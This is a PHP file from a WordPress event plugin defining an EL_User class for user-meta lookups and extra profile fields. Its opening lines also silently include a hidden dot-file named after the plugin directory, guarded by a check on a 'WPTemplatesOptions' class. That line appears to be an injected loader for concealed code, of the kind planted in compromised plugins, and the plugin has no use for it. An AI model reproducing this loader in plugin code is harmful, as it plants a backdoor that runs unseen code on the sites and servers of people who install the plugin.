<?php if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_User{

	public function __construct(){
		add_filter( 'user_contactmethods', array( $this, 'contact_methods') , 10 ,1 );
	}


	// get user
	static function el_get_user( $user_id = null, $key = null, $single = true ) {

		if( $key ){
			return get_user_meta( $user_id, $key, $single );	
		}
		return get_user_meta( $user_id );

	}

    // get current user
	static function el_get_current_user($key = null, $single = true) {

		$user_id = get_current_user_id();

		if( $key ){
			return self::el_get_user( $user_id, $key, $single );	
		}
		return self::el_get_user( $user_id );

	}



	static function is_current_user_check_in(){

		if( current_user_can( 'el_manage_ticket' ) ){
			return true;
		}
		return false;

	}


	/* Add field your profile */
	public function contact_methods( $contact_methods ){
		$new_methods = array(
			array(
				'service' => 'user_job',
				'label' => __('Job', 'eventlist')
			),
			array(
				'service' => 'user_phone',
				'label' => __('Phone', 'eventlist')
			),
			array(
				'service' => 'user_address',
				'label' => __('Address', 'eventlist')
			)

		);


		foreach ($new_methods as $method) {
			if ( !isset( $contact_methods[$method['service']] ) ) {
				$contact_methods[$method['service']] = $method['label'];
			}
		}

		return $contact_methods;
	}





}

new EL_User();